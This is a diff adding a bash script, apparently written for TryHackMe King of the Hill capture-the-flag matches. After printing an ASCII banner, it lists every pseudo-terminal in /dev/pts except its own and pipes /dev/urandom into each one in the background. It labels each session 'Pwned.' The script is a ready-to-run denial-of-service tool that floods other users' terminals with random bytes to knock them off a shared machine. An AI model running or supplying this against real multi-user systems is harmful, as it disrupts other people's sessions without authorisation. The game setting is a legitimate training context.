@@ -1,0 +1,52 @@
+#!/bin/bash
+# TryHackMe King of the Hill - /dev/urandom Spammer
+# Ryan McMillan 2022
+
+echo -e "\033[0;31m"
+echo " ██▀███   ▄▄▄       ███▄    █ ▓█████▄  ▒█████   ███▄ ▄███▓ ██▓  ██████ ▓█████  ██▀███  "
+echo "▓██ ▒ ██▒▒████▄     ██ ▀█   █ ▒██▀ ██▌▒██▒  ██▒▓██▒▀█▀ ██▒▓██▒▒██    ▒ ▓█   ▀ ▓██ ▒ ██▒"
+echo "▓██ ░▄█ ▒▒██  ▀█▄  ▓██  ▀█ ██▒░██   █▌▒██░  ██▒▓██    ▓██░▒██▒░ ▓██▄   ▒███   ▓██ ░▄█ ▒"
+echo "▒██▀▀█▄  ░██▄▄▄▄██ ▓██▒  ▐▌██▒░▓█▄   ▌▒██   ██░▒██    ▒██ ░██░  ▒   ██▒▒▓█  ▄ ▒██▀▀█▄  "
+echo "░██▓ ▒██▒ ▓█   ▓██▒▒██░   ▓██░░▒████▓ ░ ████▓▒░▒██▒   ░██▒░██░▒██████▒▒░▒████▒░██▓ ▒██▒"
+echo "░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▒░   ▒ ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▒░   ░  ░░▓  ▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ▒▓ ░▒▓░"
+echo "  ░▒ ░ ▒░  ▒   ▒▒ ░░ ░░   ░ ▒░ ░ ▒  ▒   ░ ▒ ▒░ ░  ░      ░ ▒ ░░ ░▒  ░ ░ ░ ░  ░  ░▒ ░ ▒░"
+echo "  ░░   ░   ░   ▒      ░   ░ ░  ░ ░  ░ ░ ░ ░ ▒  ░      ░    ▒ ░░  ░  ░     ░     ░░   ░ "
+echo "   ░           ░  ░         ░    ░        ░ ░         ░    ░        ░     ░  ░   ░     "
+echo
+echo "The /dev/urandom spammer for TryHackMe King of the Hill matches"
+echo "by Ryan McMillan 2022"
+echo -e "\033[0m"
+echo
+
+# Find local tty
+LOCAL_TTY=$(tty)
+
+
+# Add all ttys in /dev/pts to an array, remove ptmx
+TTY_ARRAY=(/dev/pts/*)
+for i in ${!TTY_ARRAY[@]}; do
+	if [ "${TTY_ARRAY[$i]}" == "/dev/pts/ptmx" ]; then
+		unset TTY_ARRAY[$i]
+	fi
+done
+
+#unset TTY_ARRAY[-1]
+
+# Show user our tty number and the list of other active ttys
+echo -e '\033[0;32m'
+echo "This tty: $LOCAL_TTY"
+echo -e '\033[0m'
+echo "Active ttys: [${TTY_ARRAY[@]}]"
+echo
+
+echo -e "\033[0;31m"
+# Iterate over the array
+for dir in "${TTY_ARRAY[@]}"
+do 
+    # If not our tty, then pipe /dev/urandom to tty until they close it
+    if [ "$LOCAL_TTY" != "$dir" ]; then
+        cat /dev/urandom > $dir 2>/dev/null &
+        echo "$dir Pwned." 
+   fi
+done
+echo -e "\033[0m"
